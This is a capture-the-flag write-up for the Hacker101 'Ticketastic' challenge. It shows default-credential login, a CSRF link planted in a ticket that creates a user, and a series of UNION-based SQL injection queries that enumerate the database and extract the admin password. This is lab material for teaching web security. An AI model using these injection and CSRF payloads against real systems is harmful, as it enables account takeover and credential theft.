# Ticketastic

## Description
This write up will show how to solve the CTF for "Ticketastic"

**Difficulty:** Moderate

Hints are not being provided for multiple reasons:</br>
1. It is better to figure it out yourself and I don't want to give spoilers, especially if you don't need one
2. It is only possible to get a hint every once in a while, i.e. it is not possible to get all the hints one after another. This will take too much time to "wait" for all the hints

## Solution 1st flag
First check the demo environment. With a lucky guess of `admin:admin` it is possible to login to the admin panel.</br>
Create a new user and see which endpoints are being touched upon.</br>

Stop the demo environment and go to the live environment.</br>
Create a new ticket with the same path:
```
Title: give any name
Body: <a href="http://localhost/newUser?username=testuser&password=password&password2=password">New User</a>
```

This create a link.

Now go to the login page and login with the newly created user.</br>
This will show the flag.

## Solution 2nd flag
The tickets have an id, for example: `ticket?id=1?`</br>
This means there is most probably a database involved.<br>

Try to enumerate the database in the following steps:</br>
`ticket?id=1'` --> doesn't work</br>
`ticket?id=1 and 1=1` --> does work</br>
`ticket?id=1 ORDER BY 1` --> find the number of tables, by increasing the last value, it will show that 3 is the maximum number</br>
`ticket?id=1.1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()--` --> This will show the tables: tickets and users</br>
`ticket?id=1.1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME=’users’--` --> this will show the columns for the users table: id, username and password</br>
`https://6fd960e3a640236002ac83d0aa6ba585.ctf.hacker101.com/ticket?id=1.1%20UNION%20SELECT%201,password,3%20FROM%20users%20WHERE%20username=%27admin%27--` --> query for the username admin to get the password (it won't give the password, but show the flag)</br>
